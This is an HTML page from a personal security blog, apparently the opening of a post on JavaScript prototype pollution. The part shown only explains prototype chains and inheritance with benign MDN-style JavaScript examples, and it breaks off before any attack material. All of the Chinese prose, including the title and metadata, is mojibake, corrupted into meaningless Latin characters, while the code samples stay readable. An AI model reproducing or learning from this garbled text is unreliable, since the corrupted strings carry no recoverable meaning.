<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>åˆæ¢JavaScript Prototype Pollution Attack | å¯æƒœæ²¡å¦‚æœã€m0nk3yâ€˜s Blog</title><meta name="keywords" content="æ¸—é€æµ‹è¯•,WEB å®‰å…¨"><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="ä¸€ç›´éƒ½æƒ³å­¦è¿™ä¸ª, ä½†æ˜¯ä¸€ç›´éƒ½æ²¡å­¦, ç°åœ¨æ¥å­¦ä¸€å­¦ æ€»ç»“çš„ç›®çš„, æ˜¯ä»¥åè‡ªå·±å¿˜äº†æˆ–è€…æŸ¥èµ„æ–™å°½é‡ç›´æ¥å¾€ç¬”è®°é‡Œæ‰¾äº†, ä¸ç”¨åˆ°å¤„æ‰¾, æ–¹ä¾¿ å¤ç°çš„æ—¶å€™è‡ªé—­äº†â€¦ 0x00    å‰ç½®åŸºç¡€çŸ¥è¯†æ¥æº: å‚è€ƒèµ„æ–™1 åŸå‹é“¾ä¸ç»§æ‰¿é¦–å…ˆ, æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹MDN web docs æ˜¯æ€ä¹ˆä»‹ç»è¿™ä¸ªåŸå‹é“¾çš„,  å¯¹äºä½¿ç”¨è¿‡åŸºäºç±»çš„è¯­è¨€ (å¦‚ Java æˆ– C++) çš„å¼€å‘äººå‘˜æ¥è¯´ï¼ŒJavaScript æœ‰ç‚¹ä»¤äººå›°æƒ‘ï¼Œå› ä¸ºå®ƒæ˜¯">
<meta property="og:type" content="article">
<meta property="og:title" content="åˆæ¢JavaScript Prototype Pollution Attack">
<meta property="og:url" content="https://hack-for.fun/710f.html">
<meta property="og:site_name" content="å¯æƒœæ²¡å¦‚æœã€m0nk3yâ€˜s Blog">
<meta property="og:description" content="ä¸€ç›´éƒ½æƒ³å­¦è¿™ä¸ª, ä½†æ˜¯ä¸€ç›´éƒ½æ²¡å­¦, ç°åœ¨æ¥å­¦ä¸€å­¦ æ€»ç»“çš„ç›®çš„, æ˜¯ä»¥åè‡ªå·±å¿˜äº†æˆ–è€…æŸ¥èµ„æ–™å°½é‡ç›´æ¥å¾€ç¬”è®°é‡Œæ‰¾äº†, ä¸ç”¨åˆ°å¤„æ‰¾, æ–¹ä¾¿ å¤ç°çš„æ—¶å€™è‡ªé—­äº†â€¦ 0x00    å‰ç½®åŸºç¡€çŸ¥è¯†æ¥æº: å‚è€ƒèµ„æ–™1 åŸå‹é“¾ä¸ç»§æ‰¿é¦–å…ˆ, æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹MDN web docs æ˜¯æ€ä¹ˆä»‹ç»è¿™ä¸ªåŸå‹é“¾çš„,  å¯¹äºä½¿ç”¨è¿‡åŸºäºç±»çš„è¯­è¨€ (å¦‚ Java æˆ– C++) çš„å¼€å‘äººå‘˜æ¥è¯´ï¼ŒJavaScript æœ‰ç‚¹ä»¤äººå›°æƒ‘ï¼Œå› ä¸ºå®ƒæ˜¯">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hack-for.fun/null">
<meta property="article:published_time" content="2020-04-15T00:56:06.000Z">
<meta property="article:modified_time" content="2020-08-25T08:45:35.742Z">
<meta property="article:author" content="m0nk3y">
<meta property="article:tag" content="åŸå‹é“¾æ±¡æŸ“æ”»å‡»">
<meta property="article:tag" content="Node.js">
<meta property="article:tag" content="JavaScript">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hack-for.fun/null"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hack-for.fun/710f"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2020-08-25 16:45:35'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="å¯æƒœæ²¡å¦‚æœã€m0nk3yâ€˜s Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div></div><hr/></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">å¯æƒœæ²¡å¦‚æœã€m0nk3yâ€˜s Blog</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">åˆæ¢JavaScript Prototype Pollution Attack</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-04-15T00:56:06.000Z" title="Created 2020-04-15 08:56:06">2020-04-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-08-25T08:45:35.742Z" title="Updated 2020-08-25 16:45:35">2020-08-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web-Security/">Web Security</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>ä¸€ç›´éƒ½æƒ³å­¦è¿™ä¸ª, ä½†æ˜¯ä¸€ç›´éƒ½æ²¡å­¦, ç°åœ¨æ¥å­¦ä¸€å­¦</p>
<p>æ€»ç»“çš„ç›®çš„, æ˜¯ä»¥åè‡ªå·±å¿˜äº†æˆ–è€…æŸ¥èµ„æ–™å°½é‡ç›´æ¥å¾€ç¬”è®°é‡Œæ‰¾äº†, ä¸ç”¨åˆ°å¤„æ‰¾, æ–¹ä¾¿</p>
<p>å¤ç°çš„æ—¶å€™è‡ªé—­äº†â€¦</p>
<h1 id="0x00-å‰ç½®åŸºç¡€çŸ¥è¯†"><a href="#0x00-å‰ç½®åŸºç¡€çŸ¥è¯†" class="headerlink" title="0x00    å‰ç½®åŸºç¡€çŸ¥è¯†"></a>0x00    å‰ç½®åŸºç¡€çŸ¥è¯†</h1><p>æ¥æº: å‚è€ƒèµ„æ–™1</p>
<h2 id="åŸå‹é“¾ä¸ç»§æ‰¿"><a href="#åŸå‹é“¾ä¸ç»§æ‰¿" class="headerlink" title="åŸå‹é“¾ä¸ç»§æ‰¿"></a>åŸå‹é“¾ä¸ç»§æ‰¿</h2><p>é¦–å…ˆ, æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹MDN web docs æ˜¯æ€ä¹ˆä»‹ç»è¿™ä¸ªåŸå‹é“¾çš„,</p>
<blockquote>
<p>å¯¹äºä½¿ç”¨è¿‡åŸºäºç±»çš„è¯­è¨€ (å¦‚ Java æˆ– C++) çš„å¼€å‘äººå‘˜æ¥è¯´ï¼ŒJavaScript æœ‰ç‚¹ä»¤äººå›°æƒ‘ï¼Œå› ä¸ºå®ƒæ˜¯åŠ¨æ€çš„ï¼Œå¹¶ä¸”æœ¬èº«ä¸æä¾›ä¸€ä¸ª <code>class</code> å®ç°ã€‚ï¼ˆåœ¨ ES2015/ES6 ä¸­å¼•å…¥äº† <code>class</code> å…³é”®å­—ï¼Œä½†é‚£åªæ˜¯è¯­æ³•ç³–ï¼ŒJavaScript ä»ç„¶æ˜¯åŸºäºåŸå‹çš„ï¼‰ã€‚</p>
<p>å½“è°ˆåˆ°ç»§æ‰¿æ—¶ï¼ŒJavaScript åªæœ‰ä¸€ç§ç»“æ„ï¼šå¯¹è±¡ã€‚æ¯ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆ object ï¼‰éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§ï¼ˆç§°ä¹‹ä¸º <strong>proto</strong> ï¼‰æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼ˆ<strong>prototype</strong> ï¼‰ã€‚è¯¥åŸå‹å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸå‹å¯¹è±¡( <strong>proto</strong> ) ï¼Œå±‚å±‚å‘ä¸Šç›´åˆ°ä¸€ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸º <code>null</code>ã€‚æ ¹æ®å®šä¹‰ï¼Œ<code>null</code> æ²¡æœ‰åŸå‹ï¼Œå¹¶ä½œä¸ºè¿™ä¸ª<strong>åŸå‹é“¾</strong>ä¸­çš„æœ€åä¸€ä¸ªç¯èŠ‚ã€‚</p>
<p>å‡ ä¹æ‰€æœ‰ JavaScript ä¸­çš„å¯¹è±¡éƒ½æ˜¯ä½äºåŸå‹é“¾é¡¶ç«¯çš„ <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> çš„å®ä¾‹ã€‚</p>
<p>å°½ç®¡è¿™ç§åŸå‹ç»§æ‰¿é€šå¸¸è¢«è®¤ä¸ºæ˜¯ JavaScript çš„å¼±ç‚¹ä¹‹ä¸€ï¼Œä½†æ˜¯åŸå‹ç»§æ‰¿æ¨¡å‹æœ¬èº«å®é™…ä¸Šæ¯”ç»å…¸æ¨¡å‹æ›´å¼ºå¤§ã€‚ä¾‹å¦‚ï¼Œåœ¨åŸå‹æ¨¡å‹çš„åŸºç¡€ä¸Šæ„å»ºç»å…¸æ¨¡å‹ç›¸å½“ç®€å•ã€‚</p>
</blockquote>
<p>ä»ä»‹ç»ä¸­æˆ‘ä»¬å¯ä»¥çŸ¥é“, </p>
<ol>
<li>åœ¨EC6ä¹‹å‰, JavaScript æ˜¯æ²¡æœ‰<code>class</code> å…³é”®å­—çš„</li>
<li>ç»§æ‰¿æ—¶, JavaScript åªæœ‰ä¸€ç§ç»“æ„, å¯¹è±¡</li>
<li>å¯¹è±¡(<strong>object</strong>) éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§(<strong>proto</strong>)</li>
<li><strong>proto</strong> æŒ‡å‘æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡(<strong>prototype</strong>)</li>
<li>åŸå‹å¯¹è±¡(prototype) ä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸå‹å¯¹è±¡(proto)</li>
</ol>
<h2 id="åŸºäºåŸå‹é“¾çš„ç»§æ‰¿"><a href="#åŸºäºåŸå‹é“¾çš„ç»§æ‰¿" class="headerlink" title="åŸºäºåŸå‹é“¾çš„ç»§æ‰¿"></a>åŸºäºåŸå‹é“¾çš„ç»§æ‰¿</h2><h3 id="ç»§æ‰¿å±æ€§"><a href="#ç»§æ‰¿å±æ€§" class="headerlink" title="ç»§æ‰¿å±æ€§"></a>ç»§æ‰¿å±æ€§</h3><p>JavaScript å¯¹è±¡æ˜¯åŠ¨æ€çš„å±æ€§â€œåŒ…â€ï¼ˆæŒ‡å…¶è‡ªå·±çš„å±æ€§ï¼‰ã€‚<strong>JavaScript å¯¹è±¡æœ‰ä¸€ä¸ªæŒ‡å‘ä¸€ä¸ªåŸå‹å¯¹è±¡çš„é“¾ã€‚å½“è¯•å›¾è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œå®ƒä¸ä»…ä»…åœ¨è¯¥å¯¹è±¡ä¸Šæœå¯»ï¼Œè¿˜ä¼šæœå¯»è¯¥å¯¹è±¡çš„åŸå‹ï¼Œä»¥åŠè¯¥å¯¹è±¡çš„åŸå‹çš„åŸå‹ï¼Œä¾æ¬¡å±‚å±‚å‘ä¸Šæœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåå­—åŒ¹é…çš„å±æ€§æˆ–åˆ°è¾¾åŸå‹é“¾çš„æœ«å°¾ã€‚</strong></p>
<p>ä»£ç æ¼”ç¤º: </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®©æˆ‘ä»¬ä»ä¸€ä¸ªè‡ªèº«æ‹¥æœ‰å±æ€§aå’Œbçš„å‡½æ•°é‡Œåˆ›å»ºä¸€ä¸ªå¯¹è±¡oï¼š</span></span><br><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="built_in">this</span>.a = <span class="number">1</span>;</span><br><span class="line">   <span class="built_in">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* è¿™ä¹ˆå†™ä¹Ÿä¸€æ ·</span></span><br><span class="line"><span class="comment">function f() &#123;</span></span><br><span class="line"><span class="comment">  this.a = 1;</span></span><br><span class="line"><span class="comment">  this.b = 2;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f(); <span class="comment">// &#123;a: 1, b: 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åœ¨få‡½æ•°çš„åŸå‹ä¸Šå®šä¹‰å±æ€§</span></span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸è¦åœ¨ f å‡½æ•°çš„åŸå‹ä¸Šç›´æ¥å®šä¹‰ f.prototype = &#123;b:3,c:4&#125;;è¿™æ ·ä¼šç›´æ¥æ‰“ç ´åŸå‹é“¾</span></span><br><span class="line"><span class="comment">// o.[[Prototype]] æœ‰å±æ€§ b å’Œ c</span></span><br><span class="line"><span class="comment">//  (å…¶å®å°±æ˜¯ o.__proto__ æˆ–è€… o.constructor.prototype)</span></span><br><span class="line"><span class="comment">// o.[[Prototype]].[[Prototype]] æ˜¯ Object.prototype.</span></span><br><span class="line"><span class="comment">// æœ€åo.[[Prototype]].[[Prototype]].[[Prototype]]æ˜¯null</span></span><br><span class="line"><span class="comment">// è¿™å°±æ˜¯åŸå‹é“¾çš„æœ«å°¾ï¼Œå³ nullï¼Œ</span></span><br><span class="line"><span class="comment">// æ ¹æ®å®šä¹‰ï¼Œnull å°±æ˜¯æ²¡æœ‰ [[Prototype]]ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç»¼ä¸Šï¼Œæ•´ä¸ªåŸå‹é“¾å¦‚ä¸‹: </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;a:1, b:2&#125; ---&gt; &#123;b:3, c:4&#125; ---&gt; Object.prototype---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.a); <span class="comment">// 1</span></span><br><span class="line"><span class="comment">// aæ˜¯oçš„è‡ªèº«å±æ€§å—ï¼Ÿæ˜¯çš„ï¼Œè¯¥å±æ€§çš„å€¼ä¸º 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.b); <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// bæ˜¯oçš„è‡ªèº«å±æ€§å—ï¼Ÿæ˜¯çš„ï¼Œè¯¥å±æ€§çš„å€¼ä¸º 2</span></span><br><span class="line"><span class="comment">// åŸå‹ä¸Šä¹Ÿæœ‰ä¸€ä¸ª&#x27;b&#x27;å±æ€§ï¼Œä½†æ˜¯å®ƒä¸ä¼šè¢«è®¿é—®åˆ°ã€‚</span></span><br><span class="line"><span class="comment">// è¿™ç§æƒ…å†µè¢«ç§°ä¸º&quot;å±æ€§é®è”½ (property shadowing)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.c); <span class="comment">// 4</span></span><br><span class="line"><span class="comment">// cæ˜¯oçš„è‡ªèº«å±æ€§å—ï¼Ÿä¸æ˜¯ï¼Œé‚£çœ‹çœ‹å®ƒçš„åŸå‹ä¸Šæœ‰æ²¡æœ‰</span></span><br><span class="line"><span class="comment">// cæ˜¯o.[[Prototype]]çš„å±æ€§å—ï¼Ÿæ˜¯çš„ï¼Œè¯¥å±æ€§çš„å€¼ä¸º 4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.d); <span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// d æ˜¯ o çš„è‡ªèº«å±æ€§å—ï¼Ÿä¸æ˜¯ï¼Œé‚£çœ‹çœ‹å®ƒçš„åŸå‹ä¸Šæœ‰æ²¡æœ‰</span></span><br><span class="line"><span class="comment">// d æ˜¯ o.[[Prototype]] çš„å±æ€§å—ï¼Ÿä¸æ˜¯ï¼Œé‚£çœ‹çœ‹å®ƒçš„åŸå‹ä¸Šæœ‰æ²¡æœ‰</span></span><br><span class="line"><span class="comment">// o.[[Prototype]].[[Prototype]] ä¸º nullï¼Œåœæ­¢æœç´¢</span></span><br><span class="line"><span class="comment">// æ‰¾ä¸åˆ° d å±æ€§ï¼Œè¿”å› undefined</span></span><br></pre></td></tr></table></figure>

<h3 id="ç»§æ‰¿æ–¹æ³•"><a href="#ç»§æ‰¿æ–¹æ³•" class="headerlink" title="ç»§æ‰¿æ–¹æ³•"></a>ç»§æ‰¿æ–¹æ³•</h3><blockquote>
<p><strong>JavaScript å¹¶æ²¡æœ‰å…¶ä»–åŸºäºç±»çš„è¯­è¨€æ‰€å®šä¹‰çš„â€œæ–¹æ³•â€ã€‚åœ¨ JavaScript é‡Œï¼Œä»»ä½•å‡½æ•°éƒ½å¯ä»¥æ·»åŠ åˆ°å¯¹è±¡ä¸Šä½œä¸ºå¯¹è±¡çš„å±æ€§ã€‚å‡½æ•°çš„ç»§æ‰¿ä¸å…¶ä»–çš„å±æ€§ç»§æ‰¿æ²¡æœ‰å·®åˆ«ï¼ŒåŒ…æ‹¬ä¸Šé¢çš„â€œå±æ€§é®è”½â€ï¼ˆè¿™ç§æƒ…å†µç›¸å½“äºå…¶ä»–è¯­è¨€çš„æ–¹æ³•é‡å†™ï¼‰ã€‚</strong></p>
<p><strong>å½“ç»§æ‰¿çš„å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œ<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/this">this</a> æŒ‡å‘çš„æ˜¯å½“å‰ç»§æ‰¿çš„å¯¹è±¡ï¼Œè€Œä¸æ˜¯ç»§æ‰¿çš„å‡½æ•°æ‰€åœ¨çš„åŸå‹å¯¹è±¡ã€‚</strong></p>
</blockquote>
<p>ä»£ç ç¤ºä¾‹: </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  a: <span class="number">2</span>,</span><br><span class="line">  m: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.a + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.m()); <span class="comment">// 3</span></span><br><span class="line"><span class="comment">// å½“è°ƒç”¨ o.m æ—¶ï¼Œ&#x27;this&#x27; æŒ‡å‘äº† o.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">Object</span>.create(o);</span><br><span class="line"><span class="comment">// pæ˜¯ä¸€ä¸ªç»§æ‰¿è‡ª o çš„å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">p.a = <span class="number">4</span>; <span class="comment">// åˆ›å»º p çš„è‡ªèº«å±æ€§ &#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(p.m()); <span class="comment">// 5</span></span><br><span class="line"><span class="comment">// è°ƒç”¨ p.m æ—¶ï¼Œ&#x27;this&#x27; æŒ‡å‘äº† p</span></span><br><span class="line"><span class="comment">// åˆå› ä¸º p ç»§æ‰¿äº† o çš„ m å‡½æ•°</span></span><br><span class="line"><span class="comment">// æ‰€ä»¥ï¼Œæ­¤æ—¶çš„ &#x27;this.a&#x27; å³ p.aï¼Œå°±æ˜¯ p çš„è‡ªèº«å±æ€§ &#x27;a&#x27; </span></span><br></pre></td></tr></table></figure>

<h3 id="ä½¿ç”¨åŸå‹"><a href="#ä½¿ç”¨åŸå‹" class="headerlink" title="ä½¿ç”¨åŸå‹"></a>ä½¿ç”¨åŸå‹</h3><p>åœ¨ JavaScript ä¸­ï¼Œå‡½æ•°ï¼ˆfunctionï¼‰æ˜¯å…è®¸æ‹¥æœ‰å±æ€§çš„ã€‚æ‰€æœ‰çš„å‡½æ•°ä¼šæœ‰ä¸€ä¸ªç‰¹åˆ«çš„å±æ€§ â€”â€” <code>prototype</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log( doSomething.prototype );</span><br><span class="line"><span class="comment">// å’Œå£°æ˜å‡½æ•°çš„æ–¹å¼æ— å…³ï¼Œ</span></span><br><span class="line"><span class="comment">// JavaScript ä¸­çš„å‡½æ•°æ°¸è¿œæœ‰ä¸€ä¸ªé»˜è®¤åŸå‹å±æ€§ã€‚</span></span><br><span class="line"><span class="keyword">var</span> doSomething = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log( doSomething.prototype );</span><br></pre></td></tr></table></figure>

<p>åœ¨console ä¸­çš„è¿è¡Œç»“æœ, æˆ‘åœ¨æˆ‘è‡ªå·±ç”µè„‘ä¸Šçš„Chrome/Firefox ä¸Šè¿è¡Œçš„ç»“æœä¸æ˜¯è¿™æ ·çš„â€¦ ä¸ºäº†å­¦ä¹ çš„è¯, ç›´æ¥æŠ„ä»£ç è¿‡æ¥å¥½äº†,,æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆâ€¦. (æˆ‘çŸ¥é“äº† å› ä¸ºæˆ‘æ²¡æœ‰æŠŠç‚¹å¼€â€¦ğŸ˜„)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">constructor</span>: Æ’ doSomething(),</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        <span class="keyword">constructor</span>: Æ’ Object(),</span><br><span class="line">        hasOwnProperty: Æ’ hasOwnProperty(),</span><br><span class="line">        isPrototypeOf: Æ’ isPrototypeOf(),</span><br><span class="line">        propertyIsEnumerable: Æ’ propertyIsEnumerable(),</span><br><span class="line">        toLocaleString: Æ’ toLocaleString(),</span><br><span class="line">        toString: Æ’ toString(),</span><br><span class="line">        valueOf: Æ’ valueOf()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»™<code>doSomething</code>å‡½æ•°çš„åŸå‹å¯¹è±¡æ·»åŠ æ–°å±æ€§</p>
